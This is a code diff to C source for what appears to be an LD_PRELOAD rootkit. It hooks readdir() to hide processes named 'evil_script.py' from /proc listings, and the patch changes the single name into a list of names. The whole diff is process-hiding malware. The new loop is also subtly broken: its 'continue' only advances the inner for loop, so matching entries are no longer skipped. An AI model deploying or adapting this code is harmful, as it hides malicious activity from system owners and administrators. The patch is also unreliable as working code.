@@ -9,7 +9,8 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* process_to_filter[] = {"evil_script.py"};
+int process_to_filter_count = sizeof(process_to_filter) / sizeof(char*);
 
 /*
  * Get a directory name given a DIR* handle
@@ -84,9 +85,13 @@ struct dirent* readdir(DIR *dirp)                                       \
             char process_name[256];                                     \
             if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                 strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strncmp(process_name, process_to_filter, strlen(process_name)) == 0) {         \
-                continue;                                               \
+                get_process_name(dir->d_name, process_name)) {          \
+                int i;                                                  \
+                for(i = 0; i < process_to_filter_count; i++) {          \
+                    if(strncmp(process_name, process_to_filter[i], strlen(process_name)) == 0) { \
+                        continue;                                       \
+                    }                                                   \
+                }                                                       \
             }                                                           \
         }                                                               \
         break;                                                          \
